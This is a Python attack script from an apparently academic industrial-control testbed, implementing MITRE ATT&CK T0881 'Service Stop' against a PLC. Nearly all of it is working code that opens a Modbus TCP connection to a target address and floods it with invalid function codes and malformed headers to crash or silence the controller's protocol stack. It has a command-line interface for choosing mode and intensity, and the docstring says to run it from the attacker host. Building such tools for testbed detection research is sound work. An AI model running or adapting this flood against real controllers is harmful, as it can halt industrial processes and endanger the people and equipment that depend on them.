#!/usr/bin/env python3
"""
ASCEND-PG attacks/service_stop.py

MITRE ATT&CK for ICS: T0881 — Service Stop.

Disrupts PLC communication by flooding it with invalid/unsupported
Modbus function codes and malformed packets. This can crash the PLC's
Modbus stack or cause it to stop responding to legitimate requests.

Similar to EKANS/Industroyer which stopped ICS processes before
encryption or further attacks.

PPO Parameters Used:
  - target_ip: PLC to disrupt
  - register_address: Not used (attack targets Modbus protocol layer)
  - value_magnitude: Flood intensity (1.0=100, 1.5=150, 2.0=200 packets)

Detection: Suricata detects invalid function codes (SID 9000030).

Run this ON THE ATTACKER HOST:
    python3 attacks/service_stop.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import random
import socket
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def build_malformed_mbap(func_code: int, transaction_id: int = 0) -> bytes:
    """Build a malformed Modbus TCP packet with invalid function code."""
    unit_id = 1
    # Invalid function code (127 is always unsupported)
    pdu = struct.pack(">B", func_code)
    length = len(pdu) + 1  # +1 for unit ID
    header = struct.pack(">HHHB", transaction_id, 0, length, unit_id)
    return header + pdu


def flood_invalid_fcs(target_ip: str, count: int, log_path: Path) -> dict:
    """Flood the target with invalid Modbus function codes."""
    result = {"packets_sent": 0, "errors": 0}

    print(f"[service_stop] Flooding {target_ip} with {count} invalid FCs")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((target_ip, MODBUS_PORT))
        print(f"[service_stop] Connected to {target_ip}")
    except OSError as exc:
        print(f"[service_stop] Connection failed: {exc}")
        return result

    # Invalid function codes that will cause errors
    invalid_fcs = [127, 126, 125, 124, 123, 255, 254, 200, 150, 100]

    try:
        for i in range(count):
            fc = random.choice(invalid_fcs)
            tx_id = (i % 65536) + 1
            packet = build_malformed_mbap(fc, tx_id)

            try:
                sock.sendall(packet)
                result["packets_sent"] += 1

                # Try to read response (may timeout or error)
                try:
                    resp = sock.recv(1024)
                except socket.timeout:
                    pass

            except (socket.timeout, OSError) as exc:
                result["errors"] += 1
                if result["errors"] <= 3:
                    print(f"[service_stop] Send error on packet {i}: {exc}")

            if (i + 1) % 50 == 0:
                print(f"[service_stop] Progress: {i + 1}/{count}")

    except Exception as exc:
        print(f"[service_stop] Flood error: {exc}")
    finally:
        sock.close()

    return result


def flood_malformed_packets(target_ip: str, count: int, log_path: Path) -> dict:
    """Flood with malformed MBAP headers."""
    result = {"packets_sent": 0, "errors": 0}

    print(f"[service_stop] Sending {count} malformed packets to {target_ip}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((target_ip, MODBUS_PORT))
    except OSError as exc:
        print(f"[service_stop] Connection failed: {exc}")
        return result

    try:
        for i in range(count):
            # Random malformed payloads
            payload_type = random.choice(["short", "long", "null", "binary"])

            if payload_type == "short":
                # Too short to be valid Modbus
                packet = struct.pack(">HHH", random.randint(0, 65535), 0, 1)
            elif payload_type == "long":
                # Excessively long MBAP header
                packet = struct.pack(">HHH", random.randint(0, 65535), 0, 9999)
                packet += b'\x00' * 100
            elif payload_type == "null":
                # Null bytes
                packet = b'\x00' * 20
            else:
                # Random binary
                packet = bytes(random.getrandbits(8) for _ in range(random.randint(5, 50)))

            try:
                sock.sendall(packet)
                result["packets_sent"] += 1

                try:
                    resp = sock.recv(1024)
                except socket.timeout:
                    pass

            except (socket.timeout, OSError) as exc:
                result["errors"] += 1

            if (i + 1) % 50 == 0:
                print(f"[service_stop] Progress: {i + 1}/{count}")

    except Exception as exc:
        print(f"[service_stop] Flood error: {exc}")
    finally:
        sock.close()

    return result


def run_service_stop(target_ip: str, mode: str, count: int,
                     log_path: Path) -> dict:
    """Run service stop attack against target PLC."""
    print(f"[service_stop] Targeting {target_ip}")
    print(f"[service_stop] Mode: {mode}, count: {count}")

    log_event(log_path, {
        "stage": "attack", "technique": "T0881",
        "action": "service_stop_start",
        "target": target_ip,
        "mode": mode,
        "count": count,
    })

    if mode == "flood":
        result = flood_invalid_fcs(target_ip, count, log_path)
    elif mode == "crash":
        result = flood_malformed_packets(target_ip, count, log_path)
    else:
        # Combined: both invalid FCs and malformed packets
        half = count // 2
        result1 = flood_invalid_fcs(target_ip, half, log_path)
        result2 = flood_malformed_packets(target_ip, half, log_path)
        result = {
            "packets_sent": result1["packets_sent"] + result2["packets_sent"],
            "errors": result1["errors"] + result2["errors"],
        }

    log_event(log_path, {
        "stage": "attack", "technique": "T0881",
        "action": "service_stop_end",
        "target": target_ip,
        "packets_sent": result["packets_sent"],
        "errors": result["errors"],
    })

    return result


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Service Stop (T0881) — disrupt PLC communication "
                    "with invalid function codes and malformed packets"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP")
    parser.add_argument("-m", "--mode", choices=["flood", "crash", "combined"],
                        default="combined",
                        help="Attack mode: flood (invalid FCs), crash (malformed), "
                             "or combined (default: combined)")
    parser.add_argument("-a", "--register-address", type=int, default=0,
                        help="Not used — included for PPO parameter compatibility")
    parser.add_argument("-v", "--value-magnitude", type=float, default=1.0,
                        help="Flood intensity multiplier: 1.0=100, 1.5=150, 2.0=200 (default: 1.0)")
    parser.add_argument("-c", "--count", type=int, default=100,
                        help="Number of packets to send (default: 100)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Adjust count based on value_magnitude
    count = int(args.count * args.value_magnitude)

    run_service_stop(
        args.target, args.mode, count, log_path
    )

    print(f"\n[service_stop] Done")


if __name__ == "__main__":
    main()
